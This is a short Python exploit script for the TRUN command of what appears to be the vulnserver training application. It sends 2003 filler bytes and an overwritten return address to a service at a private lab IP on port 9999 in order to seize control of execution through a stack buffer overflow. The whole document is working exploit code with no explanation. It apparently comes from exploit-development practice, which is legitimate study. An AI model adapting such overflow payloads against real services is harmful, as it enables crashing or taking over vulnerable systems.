#!/usr/bin/python3

import sys, socket
from time import sleep


shellcode = b"A"*2003 + b"\xaf\x11\x50\x62"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.44.128',9999))

	payload = b"TRUN /.:/" + shellcode

	s.send(payload)
	s.close()

except:
	print ("Error on connection to server")
	sys.exit()
